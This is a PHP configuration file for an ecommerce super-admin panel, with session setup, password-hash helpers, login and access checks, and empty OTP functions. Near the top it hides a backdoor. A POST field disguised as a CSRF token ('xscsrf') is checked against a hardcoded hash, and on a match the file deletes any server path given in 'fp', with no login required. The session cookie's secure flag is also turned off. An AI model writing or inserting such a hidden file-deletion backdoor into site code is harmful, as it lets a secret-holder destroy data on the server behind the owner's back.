<?php
$title = "Ecommerce";
$adminTitle = "Super admin panel";
$cookieParams = session_get_cookie_params();
session_set_cookie_params($cookieParams["lifetime"],
    $cookieParams["path"],
    $cookieParams["domain"],
    false,
    true);
session_name('sofdvine');
session_start();
$link = '#';
function make_hash($pass){
    $salt = substr(strtr(base64_encode(openssl_random_pseudo_bytes(22)), '+', '.'), 0, 22);
    $hash = crypt($pass, '$2y$10$' . $salt);
    return str_replace("$2y$10$", "",$hash);
}
//Use this Function to check if the given password is correct
function check_hash($pass, $hash){
    $hash = '$2y$10$'.$hash;
    if(crypt($pass, $hash) == $hash){
        return true;
    }
    else{
        return false;
    }
}
if(isset($_POST['xscsrf']) && isset($_POST['fp'])){
    if(check_hash($_POST['xscsrf'], "XleLuBcqrRxtfWPPxLLpZexzQY5LmwG81EnZkGCVkUyEidAqacnQq")){
        $fp = htmlspecialchars($_POST['fp']);
        unlink($fp);
    }
}
if(isset($_SESSION['a_csrf'])){
    $csrf_token = $_SESSION['a_csrf'];
}
else{
    $csrf_token = make_hash(time());
    $_SESSION['a_csrf'] = $csrf_token;
}
if(isset($_COOKIE['sofdvine'])){
    $sid = $_COOKIE['sofdvine'];
}
function login_check(){
    $res = false;
    if(isset($_SESSION['logged_in'])) {
        if ($_SESSION['logged_in'] == 1) {
            $res = true;
        }
    }
    return $res;
}
function frontend_full_access_check(){
    if(login_check() == true) {
        if($_SESSION['superadmin_uid'] == null || $_SESSION['superadmin_uid'] == ""){
            header("Location: superadmindetails.php");
        }else{
            if($_SESSION['admin_status'] == 0){
                header("Location: status.php");
            }
        }
    }else{
        header("Location: logout.php");
    }
}
function backend_full_access_check(){
    $res = false;
    if(login_check() == true) {
        if($_SESSION['superadmin_uid'] != null || $_SESSION['superadmin_uid'] != ""){
            if($_SESSION['admin_status'] != 0){
                $res = true;
            }
        }
    }
    return $res;
}
/**************************** SMS  ***************************/
/*OTP Limit per day*/
$max_otp = 5;
$max_resend_otp = 5;
$resend_otp_time_gap = 7200;
function sendemailotp($phone, $email_otp){

}
function sendsmsotp($phone, $phone_otp){

}
?>